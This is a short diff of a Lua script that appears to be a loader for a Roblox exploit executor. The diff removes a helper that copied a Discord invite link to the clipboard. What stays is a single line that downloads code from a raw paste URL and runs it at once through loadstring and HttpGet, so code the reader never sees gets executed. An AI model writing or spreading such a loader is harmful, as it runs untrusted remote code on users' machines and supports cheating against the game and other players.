@@ -2,18 +2,9 @@ local function s1()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/IzeJUkcJKclkktbQ/raw"))()
 end 
 
-local function s2()
-    task.spawn(function()
-        task.wait(0.5)
-        setclipboard("https://discord.gg/GmT3uvzhVH")
-        WindUI:Notify({Title = "Discord Copied!", Content = "Link copied to clipboard.", Icon = "message-circle", Duration = 4})
-    end)
-    task.wait(1)
-end
 
 
 
 
 -- Run everything
 task.spawn(s1)
-task.spawn(s2)
